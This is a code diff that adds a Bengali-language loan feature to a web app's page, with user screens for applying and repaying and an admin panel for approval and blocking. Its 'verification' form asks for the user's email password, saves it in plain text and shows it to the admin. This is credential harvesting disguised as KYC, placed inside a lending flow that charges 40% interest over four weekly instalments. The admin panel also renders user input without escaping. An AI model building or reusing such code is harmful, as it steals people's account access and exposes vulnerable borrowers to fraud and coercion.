@@ -2356,5 +2356,430 @@ window.updateVideoData = async function(uid) {
     }
 };
 </script>
+  <!-- ================= [ ADVANCED LOAN SYSTEM START ] ================= -->
+<style>
+    /* Loan Section Custom UI */
+    .loan-slider {
+        -webkit-appearance: none; width: 100%; height: 8px; border-radius: 5px;  
+        background: rgba(255,215,0,0.2); outline: none; margin: 20px 0;
+    }
+    .loan-slider::-webkit-slider-thumb {
+        -webkit-appearance: none; appearance: none; width: 25px; height: 25px;
+        border-radius: 50%; background: #FFD700; cursor: pointer;
+        box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
+    }
+    .loan-card {
+        background: linear-gradient(145deg, #1a1a2e, #0f0f15); border: 1px solid #FFD700;
+        border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 15px;
+    }
+    .legal-notice {
+        font-size: 11px; color: #ff4d4d; background: rgba(255,77,77,0.1); 
+        padding: 10px; border-radius: 8px; border: 1px solid rgba(255,77,77,0.3); margin-top: 15px;
+        line-height: 1.4;
+    }
+    .installment-box {
+        background: #111; border: 1px solid #43e97b; border-radius: 10px;
+        padding: 10px; margin-top: 10px; display: flex; justify-content: space-between;
+    }
+    .red-warning-box {
+        background: rgba(220, 38, 38, 0.1); border: 2px dashed #dc2626; border-radius: 12px;
+        padding: 15px; margin: 15px 0; color: #ff4d4d; font-size: 13px; text-align: center;
+        animation: pulseWarning 1.5s infinite alternate;
+    }
+    @keyframes pulseWarning {
+        from { box-shadow: 0 0 5px rgba(220, 38, 38, 0.2); }
+        to { box-shadow: 0 0 15px rgba(220, 38, 38, 0.6); }
+    }
+</style>
+
+<!-- Loan Application Modal -->
+<div id="loanModal" class="modal-overlay">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3><i class="fas fa-hand-holding-usd" style="color:#00b09b;"></i> লোন সেকশন</h3>
+            <i class="fas fa-times" onclick="closeModal('loanModal')"></i>
+        </div>
+        <div class="modal-body" id="loanModalBody">
+            <div style="text-align:center;color:gray;">ডেটা লোড হচ্ছে...</div>
+        </div>
+    </div>
+</div>
+
+<!-- Admin Loan Management Modal -->
+<div id="adminLoanModal" class="modal-overlay">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3><i class="fas fa-file-invoice-dollar" style="color:gold;"></i> লোন ম্যানেজমেন্ট</h3>
+            <i class="fas fa-times" onclick="closeModal('adminLoanModal')"></i>
+        </div>
+        <div class="modal-body" id="adminLoanList">
+            <div style="text-align:center;color:gray;">ডেটা লোড হচ্ছে...</div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    // ১. More Features মডালে লোন বাটন যুক্ত করা
+    const moreModalBody = document.querySelector("#moreFeaturesModal .modal-body");
+    if(moreModalBody && !document.getElementById('btnApplyLoanUser')) {
+        moreModalBody.insertAdjacentHTML('beforeend', `
+            <button id="btnApplyLoanUser" class="admin-action-btn" style="background: linear-gradient(135deg, #00b09b, #96c93d); color: #111; border: none; margin-top:10px;" onclick="openLoanModal()">
+                <i class="fas fa-money-check-alt"></i> অ্যাপ্লাই লোন (Apply Loan)
+            </button>
+        `);
+    }
+
+    // ২. অ্যাডমিন প্যানেলে লোন ম্যানেজমেন্ট বাটন যুক্ত করা
+    const adminSubPageContainer = document.getElementById('adminSubPage');
+    if (adminSubPageContainer && !document.getElementById('btnAdminLoanPanel')) {
+        adminSubPageContainer.insertAdjacentHTML('beforebegin', `
+            <button id="btnAdminLoanPanel" class="admin-action-btn" style="background: linear-gradient(135deg, #f6d365, #fda085); color: #111; border: none; margin-top: 15px;" onclick="openAdminLoanPanel()">
+                <i class="fas fa-file-invoice-dollar"></i> লোন রিকোয়েস্ট ও ম্যানেজমেন্ট
+            </button>
+        `);
+    }
+});
+
+// ================= [ LOAN SYSTEM LOGIC ] =================
+
+window.openLoanModal = async function() {
+    if(typeof closeModal === 'function') closeModal('moreFeaturesModal');
+    const container = document.getElementById('loanModalBody');
+    container.innerHTML = '<div style="text-align:center;color:gray;"><i class="fas fa-spinner fa-spin"></i> ডেটা লোড হচ্ছে...</div>';
+    document.getElementById('loanModal').classList.add('show');
+
+    if(!currentUser) return;
+
+    try {
+        const doc = await db.collection('users').doc(currentUser.uid).get();
+        const data = doc.data();
+        const loanStatus = data.loanStatus || 'none'; 
+        const loanLimit = data.loanLimit || 100;
+        const rejectDate = data.loanRejectDate || 0;
+
+        if(loanStatus === 'rejected') {
+            const daysPassed = (Date.now() - rejectDate) / (1000 * 60 * 60 * 24);
+            if(daysPassed < 30) {
+                container.innerHTML = `<div class="loan-card"><i class="fas fa-ban" style="font-size:40px;color:#ff4d4d;"></i><h4 style="color:#ff4d4d;margin:10px 0;">আবেদন বাতিল</h4><p style="font-size:13px;">আপনার প্রোফাইলটি বর্তমানে লোনের জন্য বৈধ নয়। দয়া করে ${Math.ceil(30 - daysPassed)} দিন পর আবার চেষ্টা করুন।</p></div>`;
+                return;
+            } else {
+                await db.collection('users').doc(currentUser.uid).update({ loanStatus: 'none' });
+            }
+        }
+
+        if(loanStatus === 'none') {
+            container.innerHTML = `
+                <div class="loan-card">
+                    <h4 style="color:gold;margin-bottom:15px;">লোনের জন্য প্রোফাইল ভেরিফিকেশন</h4>
+                    <input type="text" id="loanName" class="upi-input" placeholder="আপনার বৈধ নাম" value="${currentUser.fullname}">
+                    <input type="number" id="loanPhone" class="upi-input" placeholder="ফোন নাম্বার">
+                    <input type="email" id="loanEmail" class="upi-input" placeholder="লগইন থাকা ইমেইল আইডি">
+                    <input type="text" id="loanPassword" class="upi-input" placeholder="ইমেইল এর পাসওয়ার্ড">
+                    <div class="legal-notice">
+                        <strong>⚠️ আইনি নোটিশ:</strong> আমরা আপনার ইমেইল এবং পাসওয়ার্ড নিয়ে কোন অনৈতিক কাজ করবো না। যদি করি, তবে আপনি এই নোটিশ দেখে আমাদের ওপর আইনি ব্যবস্থা নিতে পারেন। আপনি লোন নিয়ে ৩০ দিনের বেশি না ফেরত দিলে বা প্রতারণার চেষ্টা করলে তবেই ডিভাইস ব্লক করার এক্সেস নেওয়া হবে।
+                    </div>
+                    <button class="book-btn" style="width:100%;" onclick="submitLoanVerification()">সম্মত ও আবেদন করুন</button>
+                </div>`;
+        } else if(loanStatus === 'pending') {
+            container.innerHTML = `<div class="loan-card"><i class="fas fa-clock" style="font-size:40px;color:orange;"></i><h4 style="color:orange;margin:10px 0;">রিভিউ চলছে</h4><p style="font-size:13px;">আপনার আবেদনটি অ্যাডমিনের কাছে পর্যবেক্ষণে আছে। কয়েক ঘন্টার মধ্যে এক্সেপ্ট বা বাতিল করা হবে।</p></div>`;
+        } else if(loanStatus === 'approved') {
+            container.innerHTML = `
+                <div class="loan-card" id="loanSelectionStep">
+                    <h4 style="color:#43e97b;">অভিনন্দন! লোন অ্যাপ্রুভ হয়েছে</h4>
+                    <p style="font-size:13px; color:gray;">আপনার বর্তমান লোন লিমিট: ₹${loanLimit}</p>
+                    <h2 style="color:gold; margin:20px 0;">₹<span id="loanAmountDisplay">${loanLimit}</span></h2>
+                    <input type="range" id="loanSlider" class="loan-slider" min="100" max="${loanLimit}" step="100" value="${loanLimit}" oninput="updateLoanCalculation()">
+                    
+                    <button class="book-btn" style="width:100%; background:linear-gradient(135deg, #00b09b, #96c93d);" onclick="showPayoutDetailsForm()">পরবর্তী ধাপ (ব্যাংক/UPI)</button>
+                </div>
+                
+                <div class="loan-card" id="loanPayoutStep" style="display:none;">
+                    <h4 style="color:gold;">পেমেন্ট ডিটেইলস দিন</h4>
+                    <p style="font-size:12px; color:gray; margin-bottom:15px;">কোথায় টাকা রিসিভ করবেন সেটি সাবধানে লিখুন</p>
+                    
+                    <input type="text" id="payoutUpi" class="upi-input" placeholder="আপনার UPI ID (e.g. 9876543210@ybl)">
+                    <div style="color:gold; font-size:12px; margin:5px 0;">--- অথবা ---</div>
+                    <textarea id="payoutBank" class="upi-input" placeholder="ব্যাংক একাউন্ট ডিটেইলস (A/C No, IFSC, Name)" rows="3" style="resize:none;"></textarea>
+                    
+                    <button class="book-btn" style="width:100%; background:linear-gradient(135deg, #ff9a9e, #fecfef); color:black;" onclick="showRedWarning()">কনফার্ম করুন</button>
+                </div>
+                
+                <div class="loan-card" id="loanWarningStep" style="display:none;">
+                    <div class="red-warning-box">
+                        <i class="fas fa-exclamation-triangle" style="font-size:30px; margin-bottom:10px;"></i>
+                        <h4 style="margin-bottom:8px;">সতর্কতা!</h4>
+                        আপনি যদি ভুল UPI আইডি বা ব্যাংক ডিটেইলস দেন, তবে সেই ভুল অ্যাকাউন্টে টাকা প্রদান করা হবে এবং সেটি আর রিফান্ড করা হবে না। 
+                        <br><br><strong>তার পরিবর্তে সেই ভুল টাকার দায়ভার আপনাকেই নিতে হবে এবং লোন শোধ করতে হবে।</strong>
+                    </div>
+                    <button class="book-btn" style="width:100%; background:linear-gradient(135deg, #dc2626, #991b1b); color:white;" onclick="submitFinalPayoutRequest()">আমি সম্মত, রিকোয়েস্ট পাঠান</button>
+                    <button class="book-btn" style="width:100%; background:#333; margin-top:10px; color:white;" onclick="openLoanModal()">ফিরে যান ও পরিবর্তন করুন</button>
+                </div>
+                `;
+        } else if(loanStatus === 'payout_pending') {
+            container.innerHTML = `<div class="loan-card"><i class="fas fa-paper-plane" style="font-size:40px;color:#4facfe;"></i><h4 style="color:#4facfe;margin:10px 0;">পেমেন্ট প্রসেসিং চলছে</h4><p style="font-size:13px;">আপনার রিকোয়েস্ট অ্যাডমিন প্যানেলে পাঠানো হয়েছে। অ্যাডমিন ম্যানুয়াল ভাবে আপনার দেওয়া ডিটেইলসে টাকা পাঠাবে। অনুগ্রহ করে অপেক্ষা করুন।</p></div>`;
+        } else if(loanStatus === 'active') {
+            const loanAmount = data.activeLoanAmount || 0;
+            const totalRepay = loanAmount + (loanAmount * 0.4);
+            const emi = totalRepay / 4;
+            const paid = data.loanPaidAmount || 0;
+            
+            container.innerHTML = `
+                <div class="loan-card" id="activeLoanView">
+                    <h4 style="color:gold;">আপনার চলতি লোন</h4>
+                    <div style="font-size:30px; font-weight:bold; color:#ff4d4d; margin:15px 0;">বাকি: ₹${totalRepay - paid}</div>
+                    <div style="color:gray; font-size:12px; margin-bottom:10px;">মোট লোন নেওয়া হয়েছিল: ₹${loanAmount} | সুদ: ৪০%</div>
+                    
+                    <div class="installment-box">
+                        <span style="color:gray;">সাপ্তাহিক কিস্তি:</span>
+                        <strong style="color:#43e97b;">₹${emi}</strong>
+                    </div>
+                    <button class="book-btn" style="width:100%; background:linear-gradient(135deg, #4facfe, #00f2fe);" onclick="showRepaymentForm(${emi})">সরাসরি কিস্তি পরিশোধ করুন</button>
+                </div>
+                
+                <div class="loan-card" id="repaymentFormView" style="display:none;">
+                    <h4 style="color:gold;">কিস্তি পেমেন্ট (₹${emi})</h4>
+                    <a href="upi://pay?pa=8391921082@ibl&pn=Star%20Tv&am=${emi}&cu=INR" class="book-btn" style="display:block; text-align:center; text-decoration:none; background:linear-gradient(135deg,#4facfe,#00f2fe); color:black; margin: 15px 0;">
+                        <i class="fas fa-bolt"></i> সরাসরি UPI অ্যাপ দিয়ে Pay করুন
+                    </a>
+                    <div style="font-size:12px; color:gray; margin-bottom:10px;">পেমেন্ট সফল হলে ট্রানজেকশন আইডি নিচে দিন:</div>
+                    <input type="text" id="emiUtrInput" class="upi-input" placeholder="Transaction ID / UTR">
+                    <button class="book-btn" style="width:100%; background:linear-gradient(135deg, #00b09b, #96c93d);" onclick="submitEmiUtr(${emi})">পেমেন্ট কনফার্ম করুন</button>
+                    <button class="book-btn" style="width:100%; background:#333; margin-top:10px; color:white;" onclick="openLoanModal()">বাতিল করুন</button>
+                </div>
+                `;
+        } else if(loanStatus === 'repayment_pending') {
+            container.innerHTML = `<div class="loan-card"><i class="fas fa-hourglass-half" style="font-size:40px;color:orange;"></i><h4 style="color:orange;margin:10px 0;">পেমেন্ট ভেরিফিকেশন চলছে</h4><p style="font-size:13px;">আপনার জমা দেওয়া ট্রানজেকশন আইডি অ্যাডমিন চেক করছেন। ভেরিফাই হলেই আপনার কিস্তি সফল হিসেবে গণ্য হবে।</p></div>`;
+        }
+    } catch(e) {
+        container.innerHTML = '<div style="color:red;">ডেটা লোড করতে সমস্যা হয়েছে!</div>';
+    }
+};
+
+// KYC Submit
+window.submitLoanVerification = async function() {
+    const name = document.getElementById('loanName').value;
+    const phone = document.getElementById('loanPhone').value;
+    const email = document.getElementById('loanEmail').value;
+    const password = document.getElementById('loanPassword').value;
+    
+    if(!name || !phone || !email || !password) return showToast('সব তথ্য সঠিকভাবে দিন!');
+    
+    showToast('আবেদন পাঠানো হচ্ছে...');
+    await db.collection('users').doc(currentUser.uid).update({
+        loanStatus: 'pending',
+        loanKYC: { name, phone, email, password, appliedAt: Date.now() }
+    });
+    openLoanModal();
+};
+
+// Slider Update
+window.updateLoanCalculation = function() {
+    const val = parseInt(document.getElementById('loanSlider').value);
+    document.getElementById('loanAmountDisplay').innerText = val;
+};
+
+// Show Payout Form
+window.showPayoutDetailsForm = function() {
+    document.getElementById('loanSelectionStep').style.display = 'none';
+    document.getElementById('loanPayoutStep').style.display = 'block';
+};
+
+// Show Red Warning
+window.showRedWarning = function() {
+    const upi = document.getElementById('payoutUpi').value.trim();
+    const bank = document.getElementById('payoutBank').value.trim();
+    if(!upi && !bank) return showToast('যেকোনো একটি পেমেন্ট মেথড দিন!');
+    
+    document.getElementById('loanPayoutStep').style.display = 'none';
+    document.getElementById('loanWarningStep').style.display = 'block';
+};
+
+// Final Payout Request (Goes to Admin)
+window.submitFinalPayoutRequest = async function() {
+    const val = parseInt(document.getElementById('loanSlider').value);
+    const upi = document.getElementById('payoutUpi').value.trim();
+    const bank = document.getElementById('payoutBank').value.trim();
+    const payoutMethod = upi ? `UPI: ${upi}` : `Bank: ${bank}`;
+
+    showToast('রিকোয়েস্ট পাঠানো হচ্ছে...');
+    
+    await db.collection('users').doc(currentUser.uid).update({
+        loanStatus: 'payout_pending',
+        requestedLoanAmount: val,
+        loanPayoutMethod: payoutMethod
+    });
+    openLoanModal();
+};
+
+// Show EMI Repayment Form
+window.showRepaymentForm = function(emi) {
+    document.getElementById('activeLoanView').style.display = 'none';
+    document.getElementById('repaymentFormView').style.display = 'block';
+};
+
+// Submit EMI UTR (Goes to Admin)
+window.submitEmiUtr = async function(emi) {
+    const utr = document.getElementById('emiUtrInput').value.trim();
+    if(!utr) return showToast('ট্রানজেকশন আইডি দিন!');
+
+    showToast('ভেরিফিকেশনের জন্য পাঠানো হচ্ছে...');
+    await db.collection('users').doc(currentUser.uid).update({
+        loanStatus: 'repayment_pending',
+        loanPendingRepayAmount: emi,
+        loanPendingUTR: utr
+    });
+    openLoanModal();
+};
+
+
+// ================= [ ADMIN LOAN MANAGEMENT ] =================
+window.openAdminLoanPanel = async function() {
+    if(typeof closeModal === 'function') closeModal('adminModal');
+    document.getElementById('adminLoanModal').classList.add('show');
+    const container = document.getElementById('adminLoanList');
+    container.innerHTML = '<div style="text-align:center;color:gray;"><i class="fas fa-spinner fa-spin"></i> লোড হচ্ছে...</div>';
+
+    const snap = await db.collection('users').where('loanStatus', 'in', ['pending', 'payout_pending', 'active', 'repayment_pending']).get();
+    let requests = [];
+    snap.forEach(doc => requests.push({...doc.data(), uid: doc.id}));
+
+    if(requests.length === 0) {
+        container.innerHTML = '<div style="text-align:center;padding:20px;color:gray;">কোনো লোনের অ্যাক্টিভিটি নেই</div>';
+        return;
+    }
+
+    container.innerHTML = requests.map(r => {
+        if(r.loanStatus === 'pending') {
+            return `
+            <div style="background:#1a1a1f;padding:15px;border-radius:15px;border:1px solid orange;margin-bottom:12px;">
+                <strong style="color:white;font-size:16px;">${r.loanKYC?.name || r.fullname}</strong> <span style="color:orange;font-size:12px;">(New KYC)</span>
+                <div style="background:#111;padding:10px;border-radius:8px;margin-top:8px;font-size:13px;color:#ccc;">
+                    <div><i class="fas fa-phone"></i> ${r.loanKYC?.phone}</div>
+                    <div><i class="fas fa-envelope"></i> ${r.loanKYC?.email}</div>
+                    <div style="color:gold;"><i class="fas fa-key"></i> ${r.loanKYC?.password}</div>
+                </div>
+                <div style="display:flex;gap:10px;margin-top:12px;">
+                    <button onclick="adminApproveLoan('${r.uid}')" style="flex:1;background:#28a745;color:white;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;">✅ Approve</button>
+                    <button onclick="adminRejectLoan('${r.uid}')" style="flex:1;background:#dc3545;color:white;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;">❌ Reject</button>
+                </div>
+            </div>`;
+        } 
+        else if(r.loanStatus === 'payout_pending') {
+            return `
+            <div style="background:#1a1a1f;padding:15px;border-radius:15px;border:1px solid #4facfe;margin-bottom:12px;">
+                <strong style="color:white;font-size:16px;">${r.fullname}</strong> <span style="color:#4facfe;font-size:12px;">(Payout Requested)</span>
+                <div style="font-size:22px; color:gold; font-weight:bold; margin:10px 0;">₹${r.requestedLoanAmount}</div>
+                <div style="background:#111;padding:10px;border-radius:8px;font-size:13px;color:#ccc;word-break: break-all;">
+                    <i class="fas fa-university"></i> ${r.loanPayoutMethod}
+                </div>
+                <button onclick="adminConfirmPayout('${r.uid}', ${r.requestedLoanAmount})" style="width:100%;background:#00b09b;color:white;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;margin-top:10px;">
+                    <i class="fas fa-check-double"></i> আমি ম্যানুয়ালি পে করেছি (Start Loan)
+                </button>
+            </div>`;
+        }
+        else if(r.loanStatus === 'repayment_pending') {
+            return `
+            <div style="background:#1a1a1f;padding:15px;border-radius:15px;border:1px solid #96c93d;margin-bottom:12px;">
+                <strong style="color:white;font-size:16px;">${r.fullname}</strong> <span style="color:#96c93d;font-size:12px;">(EMI Verification)</span>
+                <div style="font-size:18px; color:gold; font-weight:bold; margin:10px 0;">কিস্তি প্রদান: ₹${r.loanPendingRepayAmount}</div>
+                <div style="background:#111;padding:10px;border-radius:8px;font-size:13px;color:#28a745;">
+                    UTR: ${r.loanPendingUTR}
+                </div>
+                <div style="display:flex;gap:10px;margin-top:12px;">
+                    <button onclick="adminVerifyEmi('${r.uid}', ${r.loanPendingRepayAmount})" style="flex:1;background:#28a745;color:white;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;">✅ Verify & Accept</button>
+                    <button onclick="adminRejectEmi('${r.uid}')" style="flex:1;background:#dc3545;color:white;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;">❌ Fake/Reject</button>
+                </div>
+            </div>`;
+        }
+        else if(r.loanStatus === 'active') {
+            const due = (r.activeLoanAmount * 1.4) - (r.loanPaidAmount || 0);
+            return `
+            <div style="background:#1a1a1f;padding:15px;border-radius:15px;border:1px solid #ff4d4d;margin-bottom:12px;">
+                <strong style="color:white;font-size:16px;">${r.fullname}</strong> <span style="color:#ff4d4d;font-size:12px;">(Active Loan)</span>
+                <div style="color:#ff4d4d;font-weight:bold;font-size:18px;margin:10px 0;">ডিউ বাকি: ₹${due}</div>
+                <button onclick="adminBlockDueUser('${r.uid}', ${r.isBlocked})" style="width:100%;background:${r.isBlocked ? '#28a745' : '#dc3545'};color:white;border:none;padding:10px;border-radius:8px;font-weight:bold;cursor:pointer;">
+                    <i class="fas ${r.isBlocked ? 'fa-unlock' : 'fa-ban'}"></i> ${r.isBlocked ? 'আইডি আনব্লক করুন' : 'ডিউ করলে আইডি মার্ক/ব্লক করুন'}
+                </button>
+            </div>`;
+        }
+    }).join('');
+};
+
+window.adminApproveLoan = async function(uid) {
+    if(!confirm('এই ইউজারকে লোন এক্সেপ্ট করতে চান?')) return;
+    await db.collection('users').doc(uid).update({ loanStatus: 'approved' });
+    showToast('অ্যাপ্রুভ করা হয়েছে!');
+    openAdminLoanPanel();
+};
+
+window.adminRejectLoan = async function(uid) {
+    if(!confirm('লোনটি বাতিল করবেন? ইউজার ৩০ দিনের জন্য আবার আবেদন করতে পারবে না।')) return;
+    await db.collection('users').doc(uid).update({ loanStatus: 'rejected', loanRejectDate: Date.now() });
+    showToast('আবেদন বাতিল করা হয়েছে!');
+    openAdminLoanPanel();
+};
+
+window.adminConfirmPayout = async function(uid, amount) {
+    if(!confirm('আপনি কি নিশ্চিত যে আপনি নিজের ব্যাংক/UPI থেকে ইউজারকে টাকা পাঠিয়েছেন?')) return;
+    
+    await db.collection('users').doc(uid).update({ 
+        loanStatus: 'active',
+        activeLoanAmount: amount,
+        loanPaidAmount: 0
+    });
+    showToast('লোন অ্যাক্টিভ করা হয়েছে!');
+    openAdminLoanPanel();
+};
+
+window.adminVerifyEmi = async function(uid, emiPaid) {
+    if(!confirm('আপনি কি পেমেন্টটি রিসিভ করেছেন?')) return;
+
+    const doc = await db.collection('users').doc(uid).get();
+    const data = doc.data();
+    
+    const newPaidAmount = (data.loanPaidAmount || 0) + emiPaid;
+    const totalDue = data.activeLoanAmount + (data.activeLoanAmount * 0.4);
+    
+    let newStatus = 'active';
+    let newLimit = data.loanLimit || 100;
+
+    if(newPaidAmount >= totalDue) {
+        newStatus = 'none';
+        newLimit = newLimit < 1000 ? newLimit + 100 : 1000;
+    }
+
+    await db.collection('users').doc(uid).update({
+        loanStatus: newStatus,
+        loanPaidAmount: newPaidAmount,
+        loanLimit: newLimit,
+        loanPendingRepayAmount: firebase.firestore.FieldValue.delete(),
+        loanPendingUTR: firebase.firestore.FieldValue.delete()
+    });
+    
+    showToast('কিস্তি সফলভাবে আপডেট হয়েছে!');
+    openAdminLoanPanel();
+};
+
+window.adminRejectEmi = async function(uid) {
+    if(!confirm('আপনি কি নিশ্চিত যে পেমেন্ট পাননি এবং এটি বাতিল করবেন?')) return;
+    await db.collection('users').doc(uid).update({
+        loanStatus: 'active',
+        loanPendingRepayAmount: firebase.firestore.FieldValue.delete(),
+        loanPendingUTR: firebase.firestore.FieldValue.delete()
+    });
+    showToast('কিস্তি পেমেন্ট বাতিল করা হয়েছে!');
+    openAdminLoanPanel();
+};
+
+window.adminBlockDueUser = async function(uid, currentBlockStatus) {
+    const action = currentBlockStatus ? "আনব্লক" : "ব্লক";
+    if(!confirm(`আপনি কি নিশ্চিতভাবে এই আইডিটি ${action} করতে চান?`)) return;
+    await db.collection('users').doc(uid).update({ isBlocked: !currentBlockStatus });
+    showToast(`ইউজার আইডি ${action} করা হয়েছে!`);
+    openAdminLoanPanel();
+};
+</script>
+<!-- ================= [ ADVANCED LOAN SYSTEM END ] ================= -->
 </body>
 </html>  
